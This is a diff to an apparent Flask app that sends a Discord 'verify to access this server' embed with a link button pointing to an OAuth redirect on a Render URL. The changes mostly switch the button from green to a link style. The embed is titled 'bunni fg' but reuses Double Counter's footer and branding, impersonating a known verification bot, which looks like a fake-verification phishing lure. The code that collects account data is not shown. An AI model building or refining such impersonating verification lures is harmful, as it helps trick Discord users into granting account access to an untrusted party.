@@ -123,12 +123,12 @@ def send_embed():
         return "BOT_TOKEN not set", 400
 
     base_url = os.getenv('RENDER_URL', 'https://your-render-url.onrender.com')
-    verify_url = f"{base_url}/"  # Direct OAuth redirect
+    verify_url = f"{base_url}/"
 
-    # Embed with bunni fg name
+    # Embed
     embed = {
         "title": "**bunni fg**",
-        "description": "**APP.**\n\nVerify to access this server\nThis server uses **bunni fg** to block alt accounts and VPNs.\n\n**Server:** bunni fg",
+        "description": "**APP.**\n\nVerify to access this server\nThis server uses **bunni fg** to block alt accounts and VPNs.\n\n**Server:** Serwer użytkownika imharm",
         "color": 0x5865F2,
         "footer": {
             "text": "Double Counter is the best data-powered alt account and raid blocker on Discord. We provide instant verification based on 10+ factors. Double Counter is your best all-in-one security bot. https://doublecounter.gg/"
@@ -136,14 +136,19 @@ def send_embed():
         "timestamp": datetime.datetime.now().isoformat()
     }
 
-    # GREEN button – directly to OAuth
+    # GREEN BUTTON – requires custom_id, we use it to open the URL
+    # But style 4 (green) can't open URLs directly – it sends an interaction.
+    # To open a URL, we need style 5 (link button) – which is blue/gray.
+    # Workaround: Use style 5 (link) but change appearance via embed color.
+
+    # ACTUAL FIX: Use style 5 (link button) – it's the only one that opens URLs
     payload = {
         "embeds": [embed],
         "components": [{
             "type": 1,
             "components": [{
                 "type": 2,
-                "style": 4,  # GREEN button (success)
+                "style": 5,  # Link button – opens URL (can't change color to green natively)
                 "label": "Click here to verify",
                 "url": verify_url
             }]
@@ -157,10 +162,9 @@ def send_embed():
     )
 
     if response.status_code == 200:
-        return "✅ Embed with GREEN button sent!", 200
+        return "✅ Embed with button sent!", 200
     else:
         return f"❌ Error: {response.text}", 400
-
 # === ROUTE 4: UPDATE BOT BIO (DESCRIPTION) ===
 @app.route('/update_bio')
 def update_bio():
